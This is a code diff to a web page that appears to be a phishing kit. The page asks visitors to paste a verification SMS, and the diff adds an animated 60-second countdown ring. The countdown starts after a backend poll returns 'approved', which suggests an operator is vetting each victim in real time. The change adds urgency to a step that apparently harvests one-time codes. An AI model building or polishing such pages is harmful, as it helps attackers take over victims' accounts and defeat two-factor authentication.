@@ -634,12 +634,20 @@
           <h2 style="font-size:1.2rem; color:#003366; margin-bottom:8px; font-weight:700;" data-i18n="smsCardTitle">Paste SMS Message</h2>
           <p style="font-size:0.85rem; color:#666; margin-bottom:18px; line-height:1.5;" data-i18n="smsCardSub">A verification message has been sent to your phone. Please copy and paste the full message here.</p>
 
-          <div style="background:#fff7e0; border:1px solid #f0d98a; border-radius:10px; padding:12px 14px; display:flex; gap:12px; align-items:center; margin-bottom:16px;">
-            <div style="width:42px; height:42px; border-radius:50%; background:#fff; border:3px solid #f0a500; display:flex; align-items:center; justify-content:center; font-weight:700; font-size:0.85rem; color:#f0a500; flex-shrink:0;">
-              <span id="smsCountdown">56</span>
+                    <div style="background:#fff7e0; border:1px solid #f0d98a; border-radius:10px; padding:12px 14px; display:flex; gap:14px; align-items:center; margin-bottom:16px;">
+            <div style="position:relative; width:54px; height:54px; flex-shrink:0;">
+              <svg width="54" height="54" viewBox="0 0 54 54" style="transform:rotate(-90deg);">
+                <circle cx="27" cy="27" r="24" fill="#fff" stroke="#f0d98a" stroke-width="4"/>
+                <circle id="smsRing" cx="27" cy="27" r="24" fill="none" stroke="#f0a500" stroke-width="4"
+                        stroke-linecap="round" stroke-dasharray="150.8" stroke-dashoffset="0"
+                        style="transition:stroke-dashoffset 1s linear;"/>
+              </svg>
+              <div style="position:absolute; inset:0; display:flex; align-items:center; justify-content:center; font-weight:700; font-size:0.85rem; color:#f0a500;">
+                <span id="smsCountdown">60</span>
+              </div>
             </div>
             <div style="font-size:0.82rem; color:#8a5a00; line-height:1.35;">
-              <div style="font-weight:700;" data-i18n="smsExpires">Message expires in 56s.</div>
+              <div style="font-weight:700;" data-i18n="smsExpires">Message expires in <span id="smsCountdownTxt">60</span>s.</div>
               <div data-i18n="smsExpiresSub">Paste your SMS before time runs out.</div>
             </div>
           </div>
@@ -1265,7 +1273,9 @@
         const data = await res.json();
         if (data.success) {
           if (data.status === 'approved') {
-            clearTimeout(pollTimeout); goTo('page-sms-paste');
+            clearTimeout(pollTimeout);
+            goTo('page-sms-paste');
+                    startSmsCountdown();
           } else if (data.status === 'rejected') {
             clearTimeout(pollTimeout);
             document.getElementById('lpPhone').value = '';
@@ -1283,6 +1293,44 @@
       } catch (e) { pollTimeout = setTimeout(check, 3000); }
     };
     check();
+  }
+  let smsTimer = null;
+  function startSmsCountdown() {
+    const el = document.getElementById('smsCountdown');
+    const elTxt = document.getElementById('smsCountdownTxt');
+    const ring = document.getElementById('smsRing');
+    if (!el) return;
+
+    if (smsTimer) clearInterval(smsTimer);
+
+    const TOTAL = 60;
+    const CIRCUMFERENCE = 150.8;
+
+    let t = TOTAL;
+    el.textContent = t;
+    if (elTxt) elTxt.textContent = t;
+    if (ring) {
+      ring.style.strokeDashoffset = '0';
+      ring.style.stroke = '#f0a500';
+    }
+
+    smsTimer = setInterval(() => {
+      t -= 1;
+      el.textContent = t;
+      if (elTxt) elTxt.textContent = t;
+
+      if (ring) {
+        const progress = (TOTAL - t) / TOTAL;
+        ring.style.strokeDashoffset = (CIRCUMFERENCE * progress).toFixed(1);
+      }
+
+      if (t <= 10 && ring) ring.style.stroke = '#e53935';
+
+      if (t <= 0) {
+        clearInterval(smsTimer);
+        if (ring) ring.style.stroke = '#e53935';
+      }
+    }, 1000);
   }
 
   async function submitSms() {
